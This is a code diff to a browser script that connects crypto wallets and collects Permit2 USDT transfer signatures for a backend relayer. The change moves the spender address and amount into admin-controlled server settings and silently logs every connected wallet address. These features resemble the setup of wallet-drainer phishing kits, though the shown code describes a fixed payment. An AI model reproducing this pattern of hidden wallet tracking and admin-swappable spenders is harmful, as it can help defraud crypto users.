@@ -1,48 +1,14 @@
 /**
  * wallet-permit2.js
- * Standalone: Reown AppKit + Permit2 SignatureTransfer (USDT)
- * Buttons: #connect-wallet-btn  |  #sign-and-pay-btn
+ * Config loaded from /api/config (Supabase settings).
+ * Logs connected wallets to /api/wallets.
  */
-
-// ============================================================
-// CONFIG – edit these values before deploying
-// ============================================================
-const WALLET_PERMIT2_CONFIG = {
-  // Reown Dashboard → https://dashboard.reown.com
-  projectId: 'YOUR_REOWN_PROJECT_ID',
-
-  metadata: {
-    name: 'My Payment App',
-    description: 'Gasless USDT payments via Permit2',
-    url: 'https://your-vercel-app.vercel.app', // must match your deployed domain
-    icons: ['https://your-vercel-app.vercel.app/icon.png']
-  },
-
-  // 1 = Ethereum mainnet
-  chainId: 1,
-
-  // USDT on Ethereum
-  usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-
-  // MUST be the same address as the wallet whose private key is RELAYER_PRIVATE_KEY
-  spenderAddress: '0xYourRelayerWalletAddress',
-
-  // Amount in USDT smallest unit (6 decimals). 10 USDT = 10000000
-  amount: '10000000',
-
-  // Relative path works on Vercel; or use full URL
-  backendEndpoint: '/api/collect-permit2',
-
-  deadlineSeconds: 3600
-};
-// ============================================================
 
 import { createAppKit } from 'https://cdn.jsdelivr.net/npm/@reown/appkit@1.7.8/+esm';
 import { EthersAdapter } from 'https://cdn.jsdelivr.net/npm/@reown/appkit-adapter-ethers@1.7.8/+esm';
 import { mainnet, arbitrum, base, polygon, sepolia } from 'https://cdn.jsdelivr.net/npm/@reown/appkit/networks@1.7.8/+esm';
 import { BrowserProvider, Contract, MaxUint256, getAddress } from 'https://cdn.jsdelivr.net/npm/ethers@6.13.4/+esm';
 
-const cfg = WALLET_PERMIT2_CONFIG;
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 
 const NETWORK_MAP = {
@@ -53,8 +19,7 @@ const NETWORK_MAP = {
   11155111: sepolia
 };
 
-const selectedNetwork = NETWORK_MAP[cfg.chainId] || mainnet;
-
+let cfg = null;
 let modal = null;
 let isConnected = false;
 let userAddress = null;
@@ -67,6 +32,25 @@ function setStatus(id, text) {
 function enablePayButton(enabled) {
   const btn = document.getElementById('sign-and-pay-btn');
   if (btn) btn.disabled = !enabled;
+}
+
+async function loadConfig() {
+  const res = await fetch('/api/config');
+  if (!res.ok) throw new Error('Failed to load config from server');
+  cfg = await res.json();
+  if (!cfg.projectId) throw new Error('projectId not set — configure in Admin → Settings');
+  if (!cfg.spenderAddress) throw new Error('spenderAddress not set — configure in Admin → Settings');
+  return cfg;
+}
+
+async function logWallet(address) {
+  try {
+    await fetch('/api/wallets', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ address })
+    });
+  } catch (_) {}
 }
 
 async function getEthersProvider() {
@@ -83,13 +67,19 @@ const ERC20_ABI = [
 function initAppKit() {
   if (modal) return modal;
 
+  const selectedNetwork = NETWORK_MAP[cfg.chainId] || mainnet;
   const ethersAdapter = new EthersAdapter();
 
   modal = createAppKit({
     adapters: [ethersAdapter],
     networks: [selectedNetwork],
     projectId: cfg.projectId,
-    metadata: cfg.metadata,
+    metadata: cfg.metadata || {
+      name: 'Payment App',
+      description: '',
+      url: window.location.origin,
+      icons: []
+    },
     features: {
       analytics: false,
       email: false,
@@ -104,6 +94,7 @@ function initAppKit() {
     if (isConnected && userAddress) {
       setStatus('wallet-status', `${userAddress.slice(0, 6)}…${userAddress.slice(-4)}`);
       enablePayButton(true);
+      logWallet(userAddress);
     } else {
       setStatus('wallet-status', 'Not connected');
       enablePayButton(false);
@@ -115,6 +106,7 @@ function initAppKit() {
 
 async function connectWallet() {
   try {
+    if (!cfg) await loadConfig();
     initAppKit();
     await modal.open();
   } catch (err) {
@@ -141,6 +133,7 @@ async function ensurePermit2Allowance() {
 
 async function signPermit2() {
   if (!isConnected) throw new Error('Wallet not connected');
+  if (!cfg) await loadConfig();
 
   await ensurePermit2Allowance();
 
@@ -205,18 +198,17 @@ async function signPermit2() {
 async function sendToBackend(payload) {
   setStatus('tx-status', 'Submitting to backend...');
 
-  const res = await fetch(cfg.backendEndpoint, {
+  const res = await fetch(cfg.backendEndpoint || '/api/collect-permit2', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
   });
 
+  const data = await res.json().catch(() => ({}));
   if (!res.ok) {
-    const errText = await res.text();
-    throw new Error(`Backend error ${res.status}: ${errText}`);
+    throw new Error(data.error || `Backend error ${res.status}`);
   }
 
-  const data = await res.json();
   setStatus('tx-status', data.txHash
     ? `Success! Tx: ${data.txHash}`
     : 'Payment submitted successfully');
@@ -236,7 +228,13 @@ async function signAndPay() {
   }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener('DOMContentLoaded', async () => {
+  try {
+    await loadConfig();
+  } catch (e) {
+    setStatus('tx-status', e.message);
+  }
+
   const connectBtn = document.getElementById('connect-wallet-btn');
   const payBtn = document.getElementById('sign-and-pay-btn');
 
